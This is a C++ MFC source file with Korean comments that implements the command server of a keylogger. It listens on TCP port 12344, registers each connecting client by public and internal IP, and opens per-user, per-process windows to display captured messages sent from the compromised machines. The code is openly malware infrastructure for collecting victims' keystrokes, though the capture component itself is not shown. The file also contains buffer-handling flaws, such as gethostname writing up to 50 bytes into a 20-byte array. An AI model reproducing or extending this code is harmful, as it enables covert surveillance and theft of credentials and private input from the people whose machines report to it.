
// KeyLoggerServerDlg.cpp: 구현 파일
//

#include "pch.h"
#include "framework.h"
#include "Resource.h"
#include "KeyLoggerServer.h"
#include "KeyLoggerServerDlg.h"
#include "afxdialogex.h"
#include "CListenSocket.h"
#include "CClientSocket.h"
#include "CProcessesViewer.h"
#include "CProcessViewer.h"
#include "mydef.h"

#include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 응용 프로그램 정보에 사용되는 CAboutDlg 대화 상자입니다.

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 대화 상자 데이터입니다.
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 지원입니다.

// 구현입니다.
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CKeyLoggerServerDlg 대화 상자



CKeyLoggerServerDlg::CKeyLoggerServerDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_KEYLOGGERSERVER_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CKeyLoggerServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	//  DDX_Control(pDX, IDC_LIST_CLIENT, m_clientListControl);
	DDX_Control(pDX, IDC_LIST_CLIENT, m_clientListControl);
}

BEGIN_MESSAGE_MAP(CKeyLoggerServerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_CLIENT, &CKeyLoggerServerDlg::OnDblclkListClient)
END_MESSAGE_MAP()


// CKeyLoggerServerDlg 메시지 처리기

BOOL CKeyLoggerServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 시스템 메뉴에 "정보..." 메뉴 항목을 추가합니다.

	// IDM_ABOUTBOX는 시스템 명령 범위에 있어야 합니다.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != nullptr)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 이 대화 상자의 아이콘을 설정합니다.  응용 프로그램의 주 창이 대화 상자가 아닐 경우에는
	//  프레임워크가 이 작업을 자동으로 수행합니다.
	SetIcon(m_hIcon, TRUE);			// 큰 아이콘을 설정합니다.
	SetIcon(m_hIcon, FALSE);		// 작은 아이콘을 설정합니다.

	// TODO: 여기에 추가 초기화 작업을 추가합니다.

	m_pListenSocket = new CListenSocket(this);

	if (!m_pListenSocket->Create(12344)) {
		MessageBox(TEXT("Creating socket error"), TEXT("error"), MB_OK | MB_ICONERROR);
		return FALSE;
	}
	else {
		if (!m_pListenSocket->Listen()) {
			MessageBox(TEXT("Listen socket error"), TEXT("error"), MB_OK | MB_ICONERROR);
			return FALSE;
		}
	}

	CRect rect;
	m_clientListControl.GetClientRect(&rect);
	m_clientListControl.InsertColumn(0, TEXT("no"), LVCFMT_LEFT, 50);
	m_clientListControl.InsertColumn(1, TEXT("IP"), LVCFMT_LEFT, 110);
	m_clientListControl.InsertColumn(2, TEXT("Internal IP"), LVCFMT_LEFT, 110);

	char hostname[20] = "";
	if (gethostname(hostname, 50) == 0)
		strcpy(hostname, inet_ntoa(*(struct in_addr*)gethostbyname(hostname)->h_addr_list[0]));

	char buff[100] = "";
	sprintf(buff, "현재 호스트 : %s", hostname);
	CString outbuff;
	outbuff = buff;
	GetDlgItem(IDC_STATIC_HOST)->SetWindowTextW(outbuff);
	return TRUE;  // 포커스를 컨트롤에 설정하지 않으면 TRUE를 반환합니다.
}

void CKeyLoggerServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 대화 상자에 최소화 단추를 추가할 경우 아이콘을 그리려면
//  아래 코드가 필요합니다.  문서/뷰 모델을 사용하는 MFC 응용 프로그램의 경우에는
//  프레임워크에서 이 작업을 자동으로 수행합니다.

void CKeyLoggerServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 그리기를 위한 디바이스 컨텍스트입니다.

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 클라이언트 사각형에서 아이콘을 가운데에 맞춥니다.
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 아이콘을 그립니다.
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// 사용자가 최소화된 창을 끄는 동안에 커서가 표시되도록 시스템에서
//  이 함수를 호출합니다.
HCURSOR CKeyLoggerServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CKeyLoggerServerDlg::ClientAccept()
{
	// TODO: 여기에 구현 코드 추가.
	CClientSocket* newer = new CClientSocket(this);
	if (!m_pListenSocket->Accept(*newer))
	{
		MessageBox(TEXT("accept failed"), TEXT("error"), MB_OK | MB_ICONERROR);
		delete newer;
		return;
	}

	// 클라이언트 리스트에 추가
	CString IP;
	UINT port;
	newer->GetPeerName(IP, port);
	newer->IP = IP;
	int i;

	for (i = 0; i < m_clientListControl.GetItemCount(); i++)
	{
		CString IP_item = m_clientListControl.GetItemText(i, 1);

		if (IP == IP_item) // 같으면 이미 있으니까
			break; // 건너뜀
	}
	if (m_clientListControl.GetItemCount() == i) // 새로 접속한 IP가 리스트에 없으면
	{ 
		m_userList.push_back(new CProcessesViewer);

		// 리스트에 추가
		CString format;
		format.Format(TEXT("%d"), i + 1);
		m_clientListControl.InsertItem(i, format, 0);
		UpdateListCtrl(i, newer);
	}
	m_userList[i]->m_processList.push_back(new CProcessViewer);

	UINT end = m_userList[i]->m_processList.size() - 1;
	m_userList[i]->m_processList[end]->m_process = newer;
}


int CKeyLoggerServerDlg::ReceiveMSG(LPMSG32 msg, CClientSocket* process, DWORD pid)
{
	// TODO: 여기에 구현 코드 추가.
	for (int i = 0; i < m_userList.size(); i++)
	{
		if (!wcscmp(m_userList[i]->IP, process->IP) &&
			!wcscmp(m_userList[i]->internal_IP, process->internal_IP)) // IP가 일치하는 사용자를 찾고
		{
			if (m_userList[i]->m_hWnd != NULL)
				m_userList[i]->UpdateMSG(pid); // 사용자 객체로 업뎃 명령
			break;
		}
	}
	return 0;
}

int CKeyLoggerServerDlg::ReceiveMSG(LPMSG64 msg, CClientSocket* process, DWORD pid)
{
	// TODO: 여기에 구현 코드 추가.
	for (int i = 0; i < m_userList.size(); i++)
	{
		if (!wcscmp(m_userList[i]->IP, process->IP) && 
			!wcscmp(m_userList[i]->internal_IP, process->internal_IP)) // IP가 일치하는 사용자를 찾고
		{
			if(m_userList[i]->m_hWnd != NULL)
				m_userList[i]->UpdateMSG(pid); // 사용자 객체로 업뎃 명령
			break;
		}
	}
	return 0;
}

void CKeyLoggerServerDlg::OnDblclkListClient(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.

	if (pNMItemActivate->iItem != -1)
	{
		if (!m_userList[pNMItemActivate->iItem]->m_hWnd) // 윈도우 2개 동시에 켜는거 안되더라
		{
			CString format;
			format.Format(L"User#%d", pNMItemActivate->iItem + 1);

			m_userList[pNMItemActivate->iItem]->Create(IDD_DIALOG_PROCESSES, AfxGetMainWnd());
			m_userList[pNMItemActivate->iItem]->SetWindowTextW(format);
			m_userList[pNMItemActivate->iItem]->ShowWindow(SW_SHOW);
		}
	}
	*pResult = 0;
}


void CKeyLoggerServerDlg::UpdateListCtrl(int index, CClientSocket* process)
{
	// TODO: 여기에 구현 코드 추가.
	if (index == -1) // -1이면
		index = m_clientListControl.GetItemCount() - 1; // 자동으로 끝 항목 선택

	m_clientListControl.SetItemText(index, 1, process->IP);
	m_clientListControl.SetItemText(index, 2, process->internal_IP);

	m_userList[index]->IP = process->IP;
	m_userList[index]->internal_IP = process->internal_IP;
}
